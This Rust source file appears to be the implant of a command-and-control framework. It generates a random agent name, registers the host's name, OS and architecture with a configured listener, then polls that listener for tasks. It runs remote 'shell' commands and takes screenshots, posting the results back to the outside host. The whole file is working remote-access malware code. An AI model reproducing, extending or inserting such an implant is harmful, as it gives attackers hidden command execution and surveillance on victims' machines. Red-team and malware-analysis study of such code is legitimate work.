use std::{
    io::{self, Write},
    thread,
    time,
    process::Command
};

use crate::{
    core::agents::AgentData,
    Config,
    core::tasks::{
        linux::shell::shell,
        screenshot::screenshot
    },
    utils::random::random_name, config::listener,
};

pub async fn run(config: Config) -> Result<(), std::io::Error> {
    let sleep = time::Duration::from_secs(config.sleep);

    // Get agent into for registration
    let agent_name =  random_name("agent".to_owned());
    let hostname = match Command::new("hostname").output() {
        Ok(h) => {
            String::from_utf8(h.stdout).unwrap().trim().to_string()
        },
        _ => String::from("unknown"),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let mut ra = AgentData::new(agent_name, hostname, os, arch, listener_url.to_string());
    // let ra_json = serde_json::to_string(&ra).unwrap();

    // Initialize client
    let mut client = reqwest::Client::new();

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(sleep);
    
        // Register agent
        let response = match client
            .post(format!("{}{}", listener_url.to_string(), "reg"))
            .json(&ra)
            .send()
            .await
        {
            Ok(resp) => {
                registered = true;
                resp.text().await.unwrap()
            },
            Err(_) => continue,
        };
        println!("{}", response);
    }

    loop {
        // TODO: Implement graceful shutdown

        thread::sleep(sleep);

        // Get task
        let task = match client
            .post(format!("{}{}", listener_url.to_string(), "task/ask"))
            .json(&ra)
            .send()
            .await
        {
            Ok(resp) => {
                resp.text().await.unwrap()
            },
            Err(e) => {
                println!("Error fetching /task/ask: {:?}", e);
                continue;
            }
        };

        println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "screenshot" => {
                match screenshot().await {
                    Ok(result) => {
                        ra.task_result = Some(result);
                    }
                    Err(e) => {
                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
                    }
                }
                client
                    .post(format!("{}{}", listener_url.to_string(), "task/result"))
                    .json(&ra)
                    .send()
                    .await;
            }
            "shell" => {
                match shell(task_args[1..].join(" ").to_string()).await {
                    Ok(result) => {
                        ra.task_result = Some(result);
                    }
                    Err(e) => {
                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
                    }
                }
                client
                    .post(format!("{}{}", listener_url.to_string(), "task/result"))
                    .json(&ra)
                    .send()
                    .await;
            }
            _ => {
                continue;
            }
        }
    }
    
    Ok(())
}